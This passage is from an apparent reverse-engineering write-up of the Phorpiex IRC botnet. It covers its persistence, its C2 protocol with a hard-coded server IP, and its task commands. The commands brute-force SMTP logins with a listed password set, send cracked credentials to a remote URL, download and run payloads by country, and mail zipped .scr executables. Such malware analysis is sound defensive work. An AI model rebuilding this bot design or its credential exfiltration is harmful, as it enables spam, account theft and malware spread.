...
00366582 lea     ecx, [ebp+pDisabled]
00366588 push    ecx                             
00366589 push    4                               
0036658B push    0                               
0036658D push    offset ValueName                
00366592 mov     edx, [ebp+phkResult]
00366598 push    edx                             
00366599 call    ds:RegSetValueExA
</code></pre><h4 id="cleanup">Cleanup</h4><p>After the malware established persistence, the executable is run from the new location. Then the “self-destruct-bat” described in Section <a href="#quitting">Quitting</a> is called and the process exits.</p><h2 id="cc-communication">C&amp;C Communication</h2><p>This section describes the C2 communication over IRC. The <a href="#main-loop">first section</a> describes the main loop that handles connecting to the C2 server(s) as well as sending, receiving and parsing of messages. The <a href="#client-messages">second section</a> documents the client messages; the <a href="#server-messages">third section</a> the server messages. Server messages can contain tasks for the client to execute. The format of those task commands and the triggered client action are described in Section <a href="#tasks">Tasks</a>.</p><h3 id="main-loop">Main Loop</h3><p>Phorpiex has a list of hard-coded C&amp;C targets which it tries to contact, starting with the first entry in the list. After each failed C&amp;C communication, Phorpiex sleeps three seconds and then advances to the next target entry, restarting at with the first target once the list is exhausted. The number of failed rounds is counted, but never actually used.</p><p><noscript>&lt;img src="assets/img_1.png" class=""/&gt;</noscript><img alt="m" class="lazyload" data-src="assets/img_1.png" data-srcset="assets/img_1-1x.webp 480w" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI0ODAiIGhlaWdodD0iNTY4IiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjojTmFOTmFOTmFOIj48L3N2Zz4=" sizes="(max-width: 480px) 100vw, 480px"></p><p>The target hosts can be either an IP string (resolved by <code>inet_addr</code>) or a hostname (resolved by <code>gethostbyname</code>).</p><p>The reversed sample only contained one target:</p><ul><li>Host: “220.181.87.80”</li><li>Port: 5050</li></ul><p>The entire C&amp;C communication runs over Windows Sockets 2.</p><h4 id="id-string">ID String</h4><p>The malware uses fingerprinting of the operating system in combination with a random string to generate a “unique” session ID.</p><pre><code>.text:009E60B5 push    offset username ; "x"
.text:009E60BA call    get_id_string
</code></pre><p>The routine <code>get_id_string</code> identifies the following os information:</p><ul><li><p><em>Window Version</em>: By calling <code>GetVersionExA</code> and parsing the resulting <em>minor</em> and <em>major</em> version numbers, Phorpiex maps the operating system to one of the following strings: “95”, “NT”, “98”, “ME”, “2K”, “XP”, “2K3”, “VS”, “W7”, “W8”, “W10” , “UNK”.</p></li><li><p><em>Country</em>. The country is guessed from the abbreviated locale country name:</p><pre><code>  .text:009E7151 lea     edx, [ebp+locale_abbr_country]
  .text:009E7157 push    edx             ; lpLCData
  .text:009E7158 push    LOCALE_SABBREVCTRYNAME ; LCType
  .text:009E715A push    LOCALE_SYSTEM_DEFAULT ; Locale
  .text:009E715F call    ds:GetLocaleInfoA
</code></pre><p>The country is to “XXX” should the call fail.</p></li><li><p><em>32bit or 64bit</em>: By checking the program folder name for the presence of “(x86)”, Phorpiex determines if the Windows Version is 32bit or 64bit.</p></li><li><p><em>Privileges</em>: Check if running as admin (“A”) or user (“U”) using <code>IsUserAnAdmin</code>.</p></li><li><p><em>Random String</em>: Finally, to pursuit uniqueness, a string of 7 random letters “a” to “z” is built.</p></li></ul><p>Each bit of information is preceded with the pipe symbol <code>|</code> and then concatenated to form the id string. For example:</p><pre><code>|USA|W7|64|U|uggzrxq
</code></pre><p>This string is used as the identifier in the ensuing IRC communications. The ID string is regenerated after each failed IRC communication, and also after receiving 433 messages (<em>ERR_NICKNAMEINUSE</em>).</p><h3 id="client-messages">Client Messages</h3><p>The client sends only a few types of IRC messages, all of which are standard RFC 2812. <code>NICK</code> and <code>USER</code> are used to initiate the C&amp;C communication. <code>PONG</code> is sent to reply to a server’s <code>PING</code> messages that test the connection. <code>JOIN</code> is called to join channels, either provided by the server (using the “j” task, see Section <a href="#j---join-channel">j - Join Channel</a>, or in the process of handling a particular task. For example joining <code>#smtp</code> when distributing malware by email. Phorpiex also implements the <code>PRIVMSG</code> message type, but the code is not reachable.</p><h4 id="nick">NICK</h4><dl><dt>format</dt><dd><code>NICK &lt;id&gt;</code></dd><dt>example</dt><dd><code>NICK |USA|W7|64|U|hzaemsf</code></dd><dt>description</dt><dd>set the nickname, i.e., the identifying name</dd></dl><h4 id="user">USER</h4><dl><dt>format</dt><dd><code>USER &lt;username&gt; &lt;hostname&gt; &lt;servername&gt; &lt;realname&gt;</code></dd><dt>example</dt><dd><code>USER x "" "x" :x</code></dd><dt>description</dt><dd>Phorpiex sets the username, servername and realname to “x” for all clients</dd></dl><h4 id="privmsg">PRIVMSG</h4><dl><dt>format</dt><dd><code>PRIVMSG &lt;receiver&gt; :&lt;text&gt;</code></dd><dt>example</dt><dd>? |</dd><dt>description</dt><dd>Phorpiex has a routine to send private messages, but it is never called.</dd></dl><h4 id="pong">PONG</h4><dl><dt>format</dt><dd><code>PONG &lt;param&gt;</code></dd><dt>example</dt><dd><code>PONG 422</code></dd><dt>description</dt><dd>Reply to PING messages from server. If PONG messages are not acknoledge by PING, then the IRC server closes the connection.</dd></dl><h4 id="join">JOIN</h4><dl><dt>format</dt><dd><code>JOIN &lt;channel&gt; &lt;key&gt;</code></dd><dt>example</dt><dd><code>JOIN #mail (null)</code></dd><dt>description</dt><dd>Join a channel. The key is always hard-coded to 0, which gets formated as “(null)” in the <code>sprintf</code> call.</dd></dl><h3 id="server-messages">Server Messages</h3><p>The client can handle five different server command messages, some of which contain further tasks described in Section <a href="#tasks">Tasks</a>.</p><h4 id="any-message-that-contains-001">(Any Message That Contains “001”)</h4><p>The first message type is the only one not matched against the IRC command but the raw message received. The client looks for the string “001” inside the raw message, regardless of whether it is the prefix, command, or parameter of the the IRC message. If the string is found, it causes the client to join the “mail” channel, i.e., to send <code>JOIN #mail (null)</code>.</p><dl><dt>format</dt><dd><em>(any msg that contains 001)</em></dd><dt>example</dt><dd><code>:001 x.x 001</code></dd><dt>description</dt><dd>Only IRC message that is not parsed. Causes client to join the <code>#mail</code> channel</dd></dl><p>If the string “001” is not found, then the IRC message is tokenized with the space " " separator for further processing.</p><h4 id="ping">PING</h4><p>Phorpiex sends frequent PING message, matched by comparing the first token with string “PING”. If the client does not respond to these with an appropriate PONG in a timely fashion, the connection is closed. The PING messages I observed do not follow RFC 2812; instead of having one or two server parameters, the PING message is followed by <em>“422 MOTD”</em>. 422 is the numeric reply for ERR_NOMOTD (no “message of the day”) and does not make sense in this context. Regardless, the client is required to send back <code>PONG 422</code>.</p><dl><dt>format</dt><dd><code>PING &lt;param&gt; [&lt;extrastuff&gt;]</code></dd><dt>example</dt><dd><code>PING 422 MOTD</code></dd><dt>description</dt><dd>Client required to send <code>PONG &lt;param&gt;</code>, e.g., <code>PONG 422</code>. No other PING messages than the one in the example have been observed.</dd></dl><h4 id="443">443</h4><p>The third message type is a regular 433 numeric response as defined in RFC1459, matched by comparing the second token with “433”. 433 indicates that a nickname is already in use, meaning the string generated in Section <a href="#id-string">ID String</a> was not unique. Accordingly, the client generates a new id string and sends it with <code>NICK &lt;id&gt;</code>. I never saw such a message.</p><dl><dt>format</dt><dd><code>:&lt;prefix&gt; 433 &lt;target&gt;</code></dd><dt>example</dt><dd><code>:x.x 433 8.8.8.8</code></dd><dt>description</dt><dd>Regenerate the ID, then send it with <code>NICK &lt;id&gt;</code>, e.g., <code>NICK |USA|W7|64|U|kxaiiab</code></dd></dl><h4 id="privmsg-1">PRIVMSG</h4><p>The final two messages, <code>PRIVMSG</code> and <code>332</code> are used to give actual commands to the client. The messages are matched by comparing the second token to <code>PRIVMSG</code> and <code>322</code> respectively. Handling of the tasks is the same for both message types, and I’ll discuss that later in Section <a href="#tasks">Tasks</a>. The way the message is parsed is slightly different. First, the <code>PRIVMSG</code>:</p><dl><dt>format</dt><dd><code>:&lt;servername&gt;!&lt;channel&gt;@&lt;host&gt; PRIVMSG &lt;nick&gt; :&lt;task&gt;</code></dd><dt>example</dt><dd><code>:x.x!mail@x PRIVMSG USA|W7|64|U|yxpnaeg :.d u |108|99|111|(...)|106|</code></dd><dt>description</dt><dd>Execute the <code>&lt;task&gt;</code>, see later Sections. The <code>&lt;host&gt;</code> is required to be “x”, and the <code>&lt;channel&gt;</code> must be set, unless the <code>&lt;nick&gt;</code> is a channel name.</dd></dl><p>The <code>&lt;host&gt;</code> parameter needs to be set to “x”, otherwise the message is discarded. Also, if the <code>&lt;nick&gt;</code> parameter is not a channel name, i.e., beginning with “#”, then the <code>&lt;channel&gt;</code> parameter needs to be present. Like for the following <code>332</code> message, the channel is read from the parameters but never actually used.</p><h4 id="322">322</h4><p>The final message type, <code>322</code>, also send a task to the client, only in a different format. 322 is the numeric code for <code>RPL_TOPIC</code>, the task being the “topic”.</p><dl><dt>format</dt><dd><code>:&lt;prefix&gt; 332 &lt;nick&gt; &lt;channel&gt; :&lt;task&gt;</code></dd><dt>example</dt><dd><code>:x.x 332 |USA|W7|64|U|yxpnaeg #mail :.j #b</code></dd><dt>description</dt><dd>Execute the <code>&lt;task&gt;</code>, see later Sections.</dd></dl><p>The <code>&lt;prefix&gt;</code> needs to be present, but not parsed. The <code>&lt;channel&gt;</code> needs to be present and start with <code>#</code>, but as in the previous <code>PRIVMSG</code>-command is not used.</p><p>The server sends other messages than those of these five message types. For example <code>:002 x.x 002</code>. All those messages are silently ignored.</p><h2 id="tasks">Tasks</h2><p>The bot master gives commands to the client through the <code>&lt;task&gt;</code> parameter of the <code>PRIVMSG</code> and <code>322</code> message types. The <code>&lt;task&gt;</code> is <em>trailing</em> parameter, meaning it follows after “:” and is allowed to contain spaces. Phorpiex also tokenizes the <code>&lt;task&gt;</code> at the space character, with different tasks requiring different number of tokens, i.e., number of arguments.</p><p>This Section presents all types of tasks, tasked by the required number of parameters. To not get in the way of the IRC terminology, I call the first token of the task the <em>action</em>, meaning the command that is supposed to be executed. Some <em>actions</em> have multiple versions, that are selected by the following parameter. All valid tasks need to start with a “.”. So in summary, the format of a valid task is:</p><pre><code>"."&lt;action&gt; {&lt;param&gt;}
</code></pre><p>Longer running tasks are executed as threads. Phorpiex keeps track of those task in an array of up to 256 elements. Each task entry consists of three members:</p><ol><li>A numeric <em>task_id</em> that identifies the running action.</li><li>The thread handle for the task.</li><li>Potentially a Windows Socket.</li></ol><p>In the following I also put my guess what the short <code>&lt;action&gt;</code> codes could stand for.</p><h3 id="bye---quit">bye - Quit</h3><p>This task orders the client to run the self destruct bat (see Section <a href="#quitting">quitting</a>), run WSACleanup, then exit.</p><dl><dt>format</dt><dd><code>bye</code></dd><dt>nr of parameters</dt><dd>0</dd><dt>subtypes</dt><dd>none</dd><dt>example</dt><dd><code>bye</code></dd><dt>description</dt><dd>Exit</dd><dt>task id</dt><dd><em>(does not run as a task)</em></dd></dl><h3 id="moff---stop-all-mailing-tasks">m.off - Stop all Mailing Tasks</h3><p>This stops the tasks with id 2 and 3. These tasks are associated with mailing malicious content to further spread Phorpiex or any other malware, see Sections <a href="#ms---mail-exe-with-server-list">Mail Exe with Server List</a> and <a href="#mx---mail-exe-without-server-list">Mail Exe without Server List</a>. The tasks are stopped by terminating the associated thread with <code>TerminateThread</code>, closing potential corresponding Windows Sockets with <code>closesocket</code>, and setting the task id to NULL.</p><dl><dt>format</dt><dd><code>m.off</code></dd><dt>nr of parameters</dt><dd>0</dd><dt>subtypes</dt><dd>none</dd><dt>example</dt><dd><code>m.off</code></dd><dt>description</dt><dd>Stop Sending Mails</dd><dt>task id</dt><dd><em>(does not run as a task)</em></dd></dl><h3 id="boff---stop-brute-forcing">b.off - Stop Brute Forcing</h3><p>This stops the tasks with id 4. These tasks are associated with brute forcing logins to SMTP accounts, see Section <a href="#b---brute-force-smtp-accounts">b - Brute-Force SMTP Accounts</a>.</p><dl><dt>format</dt><dd><code>b.off</code></dd><dt>nr of parameters</dt><dd>0</dd><dt>subtypes</dt><dd>none</dd><dt>example</dt><dd><code>b.off</code></dd><dt>description</dt><dd>Stop Brute Forcing SMTP Accounts</dd><dt>task id</dt><dd><em>(does not run as a task)</em></dd></dl><h3 id="j---join-channel">j - Join channel</h3><p>This task orders the client to join the channel provided as the first and only parameter.</p><dl><dt>format</dt><dd><code>j &lt;channel&gt;</code></dd><dt>nr of parameters</dt><dd>1</dd><dt>subtypes</dt><dd>none</dd><dt>example</dt><dd><code>j #b</code></dd><dt>description</dt><dd>Join the <code>&lt;channel&gt;</code></dd><dt>task id</dt><dd><em>(does not run as a task)</em></dd></dl><p>This was the first task the sample received in my sandbox, ordered to join the “b” channel.</p><h3 id="b---brute-force-smtp-accounts">b - Brute-Force SMTP Accounts</h3><p>This is the first longer running task. It takes two parameters:</p><dl><dt>format</dt><dd><code>b &lt;enc_url&gt; &lt;nr_sets&gt;</code></dd><dt>nr of parameters</dt><dd>2</dd><dt>subtypes</dt><dd>none</dd><dt>example</dt><dd><code>b |108|99|111|(...)|106| 2000</code></dd><dt>description</dt><dd>Brute-Force SMTP Logins</dd><dt>task id</dt><dd>4 (exclusive)</dd></dl><p>The first parameter is an encrypted url. The bytes are passed as decimals separated by <code>|</code>. The decryption is a buggy RC4 implementation, presented in Section <a href="#rc4-implementation">RC4 Implementation</a>.</p><p>The second parameter is a decimal that determines how many different lists with SMTP server there are. Phorpiex pick a list randomly.</p><p>The task performs the following steps:</p><ol><li>Count the number of tasks running with task id 4. If there is one running already, then don’t do nothing. Otherwise create a new task with ID.</li><li>Decrypt the <code>&lt;enc_url&gt;</code> according to Section <a href="#rc4-implementation">RC4 Implementation</a>.</li><li>Append <code>ok.php</code> to the URL, e.g., <em><a href="http://example.com/">http://example.com/</a></em> becomes <em><a href="http://example.com/ok.php">http://example.com/ok.php</a></em>.</li><li>Sleep between 0 and 30 seconds, randomly determined.</li><li>Pick a set uniformly at random, between 1 and <code>&lt;nr_sets&gt;</code>. Append the random number and <code>.txt</code> to the url, e.g., <code>http://example.com/ok.php221.txt</code>.</li><li>Download the url to a random file <code>%TEMP%\&lt;10_RANDOM_DIGITS&gt;.jgp</code>, e.g., <code>c:\Users\User\AppData\Local\Temp\8473628340.jpg</code>. The downloaded content contains a list of SMTP servers.</li><li>Run three threads with the steps detailed below. The three threads slightly differ in execution; the differences are noted at the end.</li><li>Repeat Steps 4-7 3000 times.</li></ol><p>The three threads run similar steps. These are the Steps for the first thread:</p><ol><li><p>Pick a line from the downloaded file uniformly at random with <a href="https://en.wikipedia.org/wiki/Reservoir_sampling">Reservoir Sampling</a>. The line contains a hostname or IP string.</p></li><li><p>Connect to the hostname or IP on Port 25. The first two steps are shown in the following graph view. The FPU instructions calculate the harmonic fractions for the reservoir sampling.</p><p><noscript>&lt;img src="assets/img_2.png" class=""/&gt;</noscript><img alt="graph view" class="lazyload" data-src="assets/img_2.png" data-srcset="assets/img_2-1x.webp 871w,
assets/img_2-640.webp 640w" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI4NzEiIGhlaWdodD0iOTY5IiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjojTmFOTmFOTmFOIj48L3N2Zz4=" sizes="(max-width: 871px) 100vw, 871px"></p></li><li><p>If the connection fails on port 25, then the other common SMTP port 587 is attempted. If that fails also, then the process exits.</p></li><li><p>If a connection could be established on either port, then Phorpiex repeats the next steps for all combinations of these 8 usernames: <em>test</em>, <em>test1</em>, <em>test123</em>, <em>info</em>, <em>admin</em>, <em>webmaster</em>, <em>postmaster</em>, <em>contact</em> and these 20 password: <em>1234</em>, <em>12345</em>, <em>123456</em>, <em>1234567</em>, <em>12345678</em>, <em>123123</em>, <em>test</em>, <em>test1</em>, <em>test123</em>, <em>test1234</em>, <em>info</em>, <em>admin</em>, <em>admin1</em>, <em>Password1</em>, <em>password</em>, <em>1q2w3e</em>, <em>1q2w3e4r</em>, <em>q1w2e3r4</em>, <em>postmaster</em>, <em>admin</em>.</p><ul><li><p>Connect to target again.</p></li><li><p>Look at the response. If <code>ESMTP</code> send <code>EHLO USER\r\n</code>, else send <code>HELO USER\r\n</code></p></li><li><p>Check the response being <code>250</code> ( “Requested mail action okay, completed”), otherwise try next username/password combo.</p></li><li><p>Send <code>AUTH LOGIN</code>. If no <code>334</code> response follows try next username/password combo.</p></li><li><p>Send base64 encoded username. If no <code>334</code> response follows try next username/password combo.</p></li><li><p>Send base64 encoded password. If no <code>235</code> (<em>“Authentication succesful”</em>) response follows try next username/password combo.</p></li><li><p>Send <code>MAIL FROM: hi@zmail.ru\r\n</code>. If no <code>250</code> response follows try next username/password combo.</p></li><li><p>Send <code>RCPT TO: smtpcheck@Safe-mail.net\r\n</code>. If no <code>250</code> response follows try next username/password combo.</p></li><li><p>Send <code>DATA\r\n</code>. If no <code>250</code> response follows try next username/password combo.</p></li><li><p>Send this text:</p><pre><code>   Subject: hi\r\n
   From: hi@zmail.ru\r\n
   To: smtpcheck@Safe-mail.net\r\n
   \r\n.\r\n
</code></pre><p>If that is also successful, then move on to Step 5.</p></li></ul></li><li><p>Form the string:</p><pre><code> smtp://&lt;username&gt;@&lt;target&gt;|&lt;target&gt;:&lt;port&gt;|&lt;username&gt;|&lt;password&gt;"
</code></pre></li><li><p>Append this string to the download url, after <code>?s=</code>, for example:</p><pre><code>     http://example.com/ok.php221.txt?s=smtp://webmaster@example.com|example.com:25|webmaster|Password1
</code></pre></li><li><p>Use the User-Agent <em>“Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0”</em> to make a GET request to the url.</p></li><li><p>Delete the downloaded file with the targets.</p></li></ol><p>The second thread does the same as the first thread, except the username is set to the target hostname or IP, e.g., “example.com”. The third thread tries the 8 hard-coded usernames, but also appends <code>@&lt;target&gt;</code> to them. For example, <code>webmaster@example.com</code>.</p><h3 id="d---download-executable">d - Download Executable</h3><dl><dt>format</dt><dd><code>d &lt;type&gt; &lt;enc_url&gt;</code></dd><dt>nr of parameters</dt><dd>2</dd><dt>subtypes</dt><dd><code>x</code>, <code>u</code>, <code>p</code>, <code>a</code>, <code>&lt;abbr_country&gt;</code></dd><dt>example</dt><dd><code>d x |108|99|(...)|106|</code></dd><dt>description</dt><dd>Download and Run Executable</dd><dt>task id</dt><dd>1 (non exclusive)</dd></dl><p>The first parameter designates different subtypes of the task:</p><ul><li><code>x</code>: <strong>Execute</strong> the downloaded content and keep running the program</li><li><code>u</code>: Execute the donwloaded content. If the filename (without extension) is <code>w6</code>, quit. The command can be used to <strong>update</strong> Phorpiex.</li><li><code>a</code>: First geolocate the infected client. Only if the country is in the list of <strong>all</strong> hard-coded countries, execute the malware.</li><li><code>p</code>: First geolocate the infected client. Only if the country is in a <strong>partial</strong> list of hard-coded countries, execute the malware.</li><li><code>&lt;abbr_country&gt;</code>: First geolocate the infected client. Only if the country matches <code>&lt;abbr_country&gt;</code>, execute the malware.</li></ul><p>The second parameter is an encrypted url, using the same encryption as for order <code>b</code>. See Section <a href="#rc4-implementation">RC4 Implementation</a>.</p><h4 id="x---execute">x - Execute</h4><p>The task performs the following steps:</p><ol><li>Decipher the url in <code>&lt;enc_url&gt;</code>, see Section <a href="#rc4-implementation">RC4 Implementation</a>.</li><li>Add a new taks with id 1. Phorpiex allows multiple tasks to run with id 1.</li><li>Seed rand with tick count, then generate a random path <code>&lt;TEMP&gt;/&lt;10 random digits&gt;.exe</code>, e.g., <code>C:\Users\User\AppData\Local\Temp\mmliexuvnw.exe</code></li><li>Sleep between 0 to 30 seconds, determined uniformly at random.</li><li>Download the deciphered url to the random path, using <code>InternetOpenA</code> / <code>InternetOpenUrlA</code> / <code>InternetReadFile</code> with User-Agent <code>Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0</code>. This Firefox release is from June 2013.</li><li>If the download failed, then Phorpiex repeats step 3 and 4, and tries to download the file with <code>URLDownloadToFileA</code>.</li><li>If either download was successful, Phorpiex runs the executable and continues listening for new orders.</li></ol><h4 id="u---update">u - Update</h4><p>This type performs the same steps as <code>x</code>. The only difference is that after deciphering the url, Phorpiex checks if filename in the url, stripped of the extension, matches <code>w6</code>. For example, <code>http://www.example.com/w6.jpg</code> would match. If the filename matches, then Phorpiex quits if it is able to download the file. If the file can’t be downloaded, or if the filename is not <code>w6</code>, then <em>update</em> has the same effect as <em>execute</em>.</p><h4 id="a---match-against-all-country-codes">a - Match against all Country Codes</h4><p>The type <code>a</code> adds a geolocation check before downloading and executing a file.</p><ol><li><p>First, Phorpiex makes a GET request <code>api.wipmania.com</code>. This will return the public facing IP and country of the infected Client:</p><pre><code> GET / HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) 
 Gecko/20100101 Firefox/22.0
 Host: api.wipmania.com

 HTTP/1.1 200 OK
 Server: nginx
 Date: Wed, 10 Feb 2016 12:16:18 GMT
 Content-Type: text/html
 Content-Length: 19
 Connection: keep-alive
 Keep-Alive: timeout=20

 46.165.210.17&lt;br&gt;DE
</code></pre></li><li><p>Phorpiex parses the result by searching <code>&gt;</code>, and taking the string that follows. In the above example, <code>DE</code>.</p></li><li><p>Phorpiex compares the country code from <code>api.wipmania.com</code> with the following 37 countries: <code>US</code>, <code>CA</code>, <code>GB</code>, <code>AU</code>, <code>ZA</code>, <code>VI</code>, <code>VG</code>, <code>VE</code>, <code>VC</code>, <code>TT</code>, <code>TC</code>, <code>SG</code>, <code>SC</code>, <code>QA</code>, <code>PR</code>, <code>NZ</code>, <code>NA</code>, <code>MT</code>, <code>MO</code>, <code>LU</code>, <code>LC</code>, <code>KY</code>, <code>KN</code>, <code>IS</code>, <code>IE</code>, <code>HK</code>, <code>GU</code>, <code>DK</code>, <code>CY</code>, <code>CH</code>, <code>BS</code>, <code>BM</code>, <code>BH</code>, <code>BB</code>, <code>AS</code>, <code>AN</code>, <code>AE</code></p></li><li><p>If the client’s country is not in the list — <code>DE</code> for example isn’t — then the order is aborted, i.e., no file is downloaded. Otherwise, the steps as in <em>execute</em> are carried out.</p></li></ol><h4 id="p---match-against-partial-country-codes">p - Match against partial Country Codes</h4><p>Type <code>p</code> differs from <code>a</code> in that a smaller list of 5 countries are accepted: <code>US</code>, <code>GB</code>, <code>AU</code>, <code>CA</code>, <code>NZ</code>.</p><h4 id="abbr_country---match-against-provided-country">&lt;abbr_country - Match against provided Country</h4><p>Finally, if the type is neither of the above (<code>x</code>, <code>u</code>, <code>a</code> or <code>p</code>), then the first parameter to the order is treated as a country code. Downloading and executing the file only happens if the public facing IP of the infected client matches the provided country. For example, <code>d DE |108|99|...</code> will download and run the file if <code>api.wipmania.com</code> returns the country code <code>DE</code>.</p><h3 id="ms---mail-exe-with-server-list">m.s - Mail Exe with Server List</h3><dl><dt>format</dt><dd><code>m.s &lt;enc_url&gt; &lt;nr_of_files&gt;</code></dd><dt>nr of parameters</dt><dd>2</dd><dt>subtypes</dt><dd>none</dd><dt>example</dt><dd><code>m.s |108|99|(...)|106| 302</code></dd><dt>description</dt><dd>Mail an Executable</dd><dt>task id</dt><dd>3 (exclusive)</dd></dl><p>This task takes two parameters: an encrypted url and an integer that determines if the url hosts a target list.</p><ol><li><p>Check if there is already a task with ID 3 running. Return if there is a task already.</p></li><li><p>Decrypt the url, see Section <a href="#rc4-implementation">RC4 Implementation</a>.</p></li><li><p>Resolve <code>hotmail.com</code> and try to create a TCP connection on port 25. If that fails, abort the task.</p></li><li><p>Join the <em>SMTP</em> channel by sending <code>JOIN #SMTP (null)</code>.</p></li><li><p>Convert the second parameter to an integer.</p></li><li><p>Add a new task with ID 3.</p></li><li><p>Connect to <code>http://icanhazip.com</code>:</p><pre><code> GET / HTTP/1.1
 User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0
 Host: icanhazip.com

 HTTP/1.1 200 OK
 Server: nginx
 Date: Fri, 12 Feb 2016 10:35:54 GMT
 Content-Type: text/plain; charset=UTF-8
 Content-Length: 15
 Connection: close
 X-RTFM: Learn about this site at http://bit.ly/icanhazip-faq and don't abuse the service
 X-BECOME-A-RACKER: If you're reading this, apply here: http://rackertalent.com/
 Access-Control-Allow-Origin: *
 Access-Control-Allow-Methods: GET

 8.45.32.37.
</code></pre><p>Get the IP address from the response. IF that fails, use “[0.0.0.0]”, otherwise make an address to name translation with <code>getnameinfo</code>, for example <code>8.45.32.37.example.com</code></p></li><li><p>Create a random file <code>&lt;TEMP&gt;/&lt;10 random letters&gt;.jpg</code>, e.g., <code>C:\Users\User\AppData\Local\Temp\vgagsbbnkw.jpg</code>. This file will receive the executable that will be spread by mail.</p></li><li><p>Sleep 0 to 30 seconds, determined uniformly at random.</p></li><li><p>Download <code>&lt;url&gt;d.exe</code> to the random file.</p></li><li><p>Create another url <code>&lt;url&gt;s.txt</code>. Create another temp file with the same pattern as in Step 8 and download from the url to the new temp path. This file holds SMTP servers along with the credentials.</p></li><li><p>Build a random zip file <code>&lt;TEMP&gt;/&lt;RANDOM_10_LETTERS&gt;.zip</code>, this ZIP file will receive the executable later sent by mail.</p></li><li><p>Create a random scr filename: <code>DOC&lt;RAND_10_DIGITS&gt;-PDF.scr</code>, e.g., <code>DOC7566358436-PDF.scr</code>. This is the filename that the executable inside the ZIP gets.</p></li><li><p>Create a random jpg <code>&lt;TEMP&gt;/&lt;RANDOM_10_LETTERS&gt;.jpg</code>. This file will receive the base64 encoded version of the ZIP file. Phorpiex needs the base64 encoding for the SMTP MIME transfer.</p></li><li><p>Write the downloaded executable from Step 10 to the ZIP file from Step 12. The ZIP file is built manually, field by field. First the header is written:</p><ul><li>The local header signature: <code>PK\x03\x04</code></li><li>The required version: 10</li><li>General purpose bit flag: 0 (no compression)</li><li>File last modification time and date: set to the current time and date.</li><li>CRC-32: Calculated for the downloaded executable.</li><li>Compressed and Uncompressed size: Set to the file size of the downloaded executable (as there is no compression used, the two are equal).</li><li>File name length (n): Length of the random scr string from Step 13, should always be 0x15</li><li>Extra field length (m): Set to zero.</li><li>File name: Filename from Step 13.</li></ul><p>Then the downloaded file content is written to the ZIP file. Finally:</p><ul><li>The local header signature: <code>PK\x03\x04</code></li><li>The central directory is written.</li><li>The end of central directory record is written.</li></ul><p>The following image shows an example. <code>Z</code> stands for the downloaded executable content:<noscript>&lt;img src="assets/img_3.png" class=""/&gt;</noscript><img alt="ZIP file example" class="lazyload" data-src="assets/img_3.png" data-srcset="assets/img_3-1x.webp 617w" src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSI2MTciIGhlaWdodD0iMjE3IiBzdHlsZT0iYmFja2dyb3VuZC1jb2xvcjojTmFOTmFOTmFOIj48L3N2Zz4=" sizes="(max-width: 617px) 100vw, 617px"></p></li><li><p>The ZIP file from Step 15 is base64 encoded and written to the “jpg”-file from Step 14. The zip file is deleted thereafter.</p></li><li><p>The url <code>&lt;url&gt;&lt;r&gt;.txt</code> is built, where <code>&lt;url&gt;</code> is the decrypted url from Step 2, and <code>&lt;r&gt;</code> <em>= rand() % (nr + 1)</em>, with <em>nr</em> from Step 5. The file is downloaded to a new random JPG file with pattern as in Step 14. This file holds the mail recipients.</p></li><li><p>Next, the following steps are repeated 2000 times (unless the task is aborted by an <code>m.off</code> message):</p><ul><li>Spawn a mailing thread described in the next Section. Don’t wait for its completion.</li><li>Sleep between 0 and 100 milliseconds, randomly determined.</li></ul></li><li><p>After the 2000 threads have been spawned, the download file from Step 10 is deleted and the task is finished.</p></li></ol><p>To summarize these are the files used by this task:</p><table><thead><tr><th></th><th>path</th><th>source</th><th>step</th><th>description</th></tr></thead><tbody><tr><td>A</td><td><code>%TEMP%/&lt;10_random_letters&gt;.jpg</code></td><td><code>&lt;url&gt;d.exe</code></td><td>8, 10</td><td>the (malicious) executable</td></tr><tr><td>B</td><td><code>%TEMP%/&lt;10_random_letters&gt;.jpg</code></td><td><code>&lt;url&gt;s.exe</code></td><td>11</td><td>the list of SMTP servers and credentials</td></tr><tr><td>C</td><td><code>%TEMP%/&lt;10_random_letters&gt;.zip</code></td><td>ZIP(B)</td><td>12, 15</td><td>the zipped executable</td></tr><tr><td>D</td><td><code>%TEMP%/&lt;10_random_letters&gt;.jpg</code></td><td>BASE64(C)</td><td>14, 16</td><td>the base64 encoding of the zip file</td></tr><tr><td>E</td><td><code>%TEMP%/&lt;10_random_letters&gt;.jpg</code></td><td><code>&lt;url&gt;&lt;r&gt;.txt</code></td><td>17</td><td>the list of recipients</td></tr></tbody></table><h4 id="mailing-thread">Mailing Thread</h4><p>The mailing routine performs the following steps:</p><ol><li><p>A random line from the file from file <em>E</em> (Step 17) is picked. This line contains the mail address of the recipient.</p></li><li><p>A random line from the file from file <em>B</em> (Step 11) is picked. The line contains the following information:</p><pre><code> &lt;server&gt;|&lt;username&gt;|&lt;password&gt;|&lt;port&gt;
</code></pre><p>where <code>&lt;server&gt;</code> and <code>&lt;port&gt;</code> are the hostname and port of a SMTP server respectively; with authentication <code>&lt;username&gt;</code> and <code>&lt;password&gt;</code>.</p></li><li><p>The SMTP server is connected to on the provided <code>&lt;port&gt;</code>. If the server response contains <code>ESMTP</code>, then <code>EHLO</code> verb, else the <code>HELO</code> verb.</p></li><li><p>Phorpiex then tries to resolve the random domain of pattern <code>&lt;4 digits&gt;.com</code>. The malware generates those random domains until one resolves to an IP.</p></li><li><p>Phorpiex authenticates with <code>AUTH LOGIN</code> and passing the base64 encoded <code>&lt;username&gt;</code> and <code>&lt;password&gt;</code>. If this is successful (response is <code>334</code> after <code>AUTH LOGIN</code> and sending the username, and <code>235</code> after sending the password), then the mail in the next Section is sent to the <code>&lt;recipient&gt;</code>.</p></li></ol><h4 id="mail">Mail</h4><p>Phorpiex sends the following 